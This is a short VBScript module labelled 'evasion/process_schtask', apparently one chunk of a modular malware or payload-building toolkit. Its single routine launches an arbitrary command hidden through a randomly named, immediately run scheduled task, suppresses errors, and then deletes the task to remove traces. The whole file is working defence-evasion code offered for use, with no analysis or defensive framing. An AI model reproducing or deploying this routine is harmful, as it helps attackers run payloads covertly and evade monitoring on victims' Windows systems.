' chunk: evasion/process_schtask
' depends: (none)
' provides: create_process
' format: vbscript
' note: Process creation via immediate scheduled task

Sub create_process(cmd)
    On Error Resume Next
    Dim sh, taskName
    Set sh = CreateObject("WScript.Shell")
    taskName = "T" & Replace(Timer, ".", "")
    sh.Run "schtasks /create /tn """ & taskName & """ /tr """ & cmd & """ /sc once /st 00:00 /f", 0, True
    sh.Run "schtasks /run /tn """ & taskName & """", 0, True
    WScript.Sleep 2000
    sh.Run "schtasks /delete /tn """ & taskName & """ /f", 0, True
End Sub
